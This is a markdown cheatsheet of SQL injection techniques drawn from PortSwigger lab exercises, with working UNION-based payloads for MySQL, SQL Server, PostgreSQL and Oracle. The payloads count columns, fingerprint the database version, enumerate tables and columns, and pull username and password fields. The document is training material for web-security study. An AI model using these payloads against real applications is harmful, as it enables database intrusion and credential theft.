# SQL Injection Cheatsheets
- Labs from portswigger labs
## SQL Database
> Here are commands to find MySQL, Microsoft SQL server [Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![SQL Database Structure](https://github.com/ashok5141/Application-Security-Cheatsheet/blob/main/Images/SQL_db.png)
- Identifying number of columns available in SQL database to craft the union select command 
```bash
# Pets is the parameter in the URL 
Pets' order by 1#  # Increase the number starting from 1 to so on, when ever you get the 500 error then n-1 columns are their
Pets' order by 3#    # Error 500 internal server error decided with go for 2 columns in this case
Pets' order by 2#     # No error 200 OK
Pets'union select null, null#
```
- Identifying Version of SQL database
```bash
Pets'union select @@version, null#      # Microsoft SQL, MySQL
Pets'union select version(), null#      # PostgreSQL
```
- List of Tables from the Oracle database
```bash
Pets'union select table_name, null from information_schema.tables--      # or you can use # instead of --
```
- Extract Data in tables
```bash
Pets'union select column_name, null from information_schema.columns where table_name = 'users_xacgsm'--    # List of columns
Pets'union select username_pxqwui, password_bfvoxs from users_xacgsm--
Pets'union select username_pxqwui ||'~'|| password_bfvoxs, null from users_xacgsm--  # Printing username and password one cloumn with '~' sign in between
```

## ORACLE Database
> Here are commands to find ORACLE DB [Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![Oracle Database Structure](https://github.com/ashok5141/Application-Security-Cheatsheet/blob/main/Images/Oracle_db.png)
- Identifying number of columns available in Oracle database to craft the union select command 
```bash
# Pets is the parameter in the URL 
Pets' order by 1--    # Increase the number starting from 1 to so on, when ever you get the 500 error then n-1 columns are their
Pets' order by 3--    # Error 500 internal server error decided with go for 2 columns in this case
# Asume here 2 columns, when I use the number 3 error of 500 internal server error
Pets' order by 2--     # No error 200 OK
Pets'union select null, null from DUAL--     # DUALinternal table in ORACLE
Pets'union select 'a', 'a' from DUAL--
```
- Identifying Version of Oracle database
```bash
Pets'union select null, banner from v$version--
```
- List of Tables from the Oracle database
```bash
' union select table_name from all_tables--  # It will provide the table names check for user keywords
```
- Extract Data in tables
```bash
Pets'union select column_name null from+all_tab_columns where table_name = 'USERS_BPAWFN'--    # List of columns
Pets'union select USERNAME_RABKTC,PASSWORD_YOEYVJ from+USERS_BPAWFN--
```

## SQL injection UNION attacks

> when an application is vulnerable to SQL injection, and the results of the query are returned within the application's response, you can use the ```UNION``` keyword to retrive data from other tables within the database. This is commonly know as a SQL injection UNION attack.

- The ```UNION``` keyword enables you to execute one or more additional ```SELECT``` queries and append the results to the original query. For example:
```bash
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
- This SQL query returns a single result set with two columns, containing values from columns ```a``` and ```b``` in ```table1``` and columns ```c``` and ```d``` in ```table2```.
- For a ```UNION``` query to work, two key requirements must be met:
    - The individual queries must return the same number of columns.
    - The data types in each column must be compatible between the individual queries.
- To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:
    - How many columns are being returned from the original query.
    - Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

#### Determining the number of columns required
- When trying the SQL ```UNION``` injection their are 2 ways
- One method
    - ' ORDER BY 1--
- The second method
    - ' UNION SELECT NULL--
- You need to increase the number in order and null value in ```UNION SELECT``` command, until you get an error in the output page.
```bash
# One method
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
# The second method
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
